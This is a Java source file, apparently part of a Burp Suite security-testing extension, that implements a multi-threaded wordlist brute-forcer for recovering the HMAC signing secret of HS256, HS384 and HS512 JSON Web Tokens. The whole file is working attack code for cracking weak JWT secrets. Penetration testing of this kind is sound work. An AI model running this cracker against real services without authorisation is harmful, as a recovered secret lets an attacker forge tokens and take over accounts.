package com.sn1persecurity.silentchain.bapp.modules.jwt;

import javax.crypto.Mac;
import javax.crypto.spec.SecretKeySpec;
import java.nio.charset.StandardCharsets;
import java.io.File;
import java.util.Base64;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicReference;
import java.util.function.Consumer;

/**
 * Multi-threaded HMAC JWT secret brute-forcer.
 * Supports HS256, HS384, HS512.
 * Reports progress via callbacks for live UI updates.
 */
public class JwtBruteForcer {

    /**
     * Result of a brute-force attempt.
     */
    public record BruteForceResult(
            boolean cracked,
            String secret,
            int totalAttempts,
            long durationMs,
            double keysPerSecond
    ) {
        public String summary() {
            if (cracked) {
                return String.format("🔥 SECRET CRACKED: \"%s\" (%,d attempts in %.1fs — %.0f keys/sec)",
                        secret, totalAttempts, durationMs / 1000.0, keysPerSecond);
            } else {
                return String.format("❌ Secret not found (%,d attempts in %.1fs — %.0f keys/sec)",
                        totalAttempts, durationMs / 1000.0, keysPerSecond);
            }
        }
    }

    /**
     * Progress update callback data.
     */
    public record Progress(int current, int total, String lastTested, double keysPerSec) {}

    private final JwtToken token;
    private final AtomicBoolean cancelled = new AtomicBoolean(false);
    private final AtomicBoolean found = new AtomicBoolean(false);
    private final AtomicReference<String> foundSecret = new AtomicReference<>(null);
    private final AtomicInteger attemptCount = new AtomicInteger(0);

    private Consumer<String> logCallback;
    private Consumer<Progress> progressCallback;

    public JwtBruteForcer(JwtToken token) {
        this.token = token;
    }

    public void setLogCallback(Consumer<String> callback) {
        this.logCallback = callback;
    }

    public void setProgressCallback(Consumer<Progress> callback) {
        this.progressCallback = callback;
    }

    public void cancel() {
        cancelled.set(true);
    }

    public boolean isCancelled() {
        return cancelled.get();
    }

    /**
     * Run brute-force attack using the built-in wordlist.
     */
    public BruteForceResult bruteForceBuiltIn(int threadCount) {
        return bruteForce(JwtWordlist.TOP_SECRETS, threadCount);
    }

    /**
     * Run brute-force attack using a custom wordlist file.
     */
    public BruteForceResult bruteForceFromFile(File wordlistFile, int threadCount) {
        try {
            List<String> secrets = JwtWordlist.combinedWordlist(wordlistFile);
            return bruteForce(secrets, threadCount);
        } catch (Exception e) {
            log("[JWT-BRUTE] ❌ Failed to load wordlist: " + e.getMessage());
            return new BruteForceResult(false, null, 0, 0, 0);
        }
    }

    /**
     * Core brute-force engine.
     */
    public BruteForceResult bruteForce(List<String> secrets, int threadCount) {
        String alg = token.algorithm();
        if (!alg.startsWith("HS")) {
            log("[JWT-BRUTE] ⚠️ Token uses " + alg + " — HMAC brute-force only works with HS256/HS384/HS512.");
            return new BruteForceResult(false, null, 0, 0, 0);
        }

        String macAlg = switch (alg.toUpperCase()) {
            case "HS384" -> "HmacSHA384";
            case "HS512" -> "HmacSHA512";
            default -> "HmacSHA256";
        };

        int total = secrets.size();
        log("[JWT-BRUTE] 🚀 Starting HMAC brute-force (" + alg + ") with " + total + " candidate secrets using " + threadCount + " threads...");

        // Pre-compute expected signature and signing data
        String tokenStr = token.originalToken();
        int lastDot = tokenStr.lastIndexOf('.');
        String signingInput = tokenStr.substring(0, lastDot);
        byte[] expectedSig = token.signatureBytes();

        long startTime = System.currentTimeMillis();
        ExecutorService pool = Executors.newFixedThreadPool(threadCount);

        for (String secret : secrets) {
            if (cancelled.get() || found.get()) break;

            pool.submit(() -> {
                if (cancelled.get() || found.get()) return;

                int count = attemptCount.incrementAndGet();

                try {
                    Mac mac = Mac.getInstance(macAlg);
                    mac.init(new SecretKeySpec(secret.getBytes(StandardCharsets.UTF_8), macAlg));
                    byte[] computed = mac.doFinal(signingInput.getBytes(StandardCharsets.UTF_8));

                    if (constantTimeEquals(computed, expectedSig)) {
                        found.set(true);
                        foundSecret.set(secret);
                        log("[JWT-BRUTE] 🔥🔥🔥 SECRET FOUND: \"" + secret + "\" (attempt #" + count + ")");
                    } else {
                        if (count % 50 == 0) {
                            long elapsed = System.currentTimeMillis() - startTime;
                            double kps = elapsed > 0 ? count * 1000.0 / elapsed : 0;
                            log("[JWT-BRUTE] Testing #" + count + "/" + total + ": \"" + truncate(secret, 30) + "\" → mismatch (" + String.format("%.0f", kps) + " keys/sec)");
                            if (progressCallback != null) {
                                progressCallback.accept(new Progress(count, total, secret, kps));
                            }
                        }
                    }
                } catch (Exception e) {
                    // Skip invalid keys silently
                }
            });
        }

        pool.shutdown();
        try {
            pool.awaitTermination(30, TimeUnit.MINUTES);
        } catch (InterruptedException ignored) {
            Thread.currentThread().interrupt();
        }

        long duration = System.currentTimeMillis() - startTime;
        int totalAttempts = attemptCount.get();
        double kps = duration > 0 ? totalAttempts * 1000.0 / duration : 0;

        BruteForceResult result = new BruteForceResult(found.get(), foundSecret.get(), totalAttempts, duration, kps);
        log("[JWT-BRUTE] " + result.summary());

        return result;
    }

    private void log(String msg) {
        if (logCallback != null) {
            logCallback.accept(msg);
        }
    }

    private String truncate(String s, int max) {
        return s.length() <= max ? s : s.substring(0, max) + "...";
    }

    private static boolean constantTimeEquals(byte[] a, byte[] b) {
        if (a.length != b.length) return false;
        int result = 0;
        for (int i = 0; i < a.length; i++) {
            result |= a[i] ^ b[i];
        }
        return result == 0;
    }
}
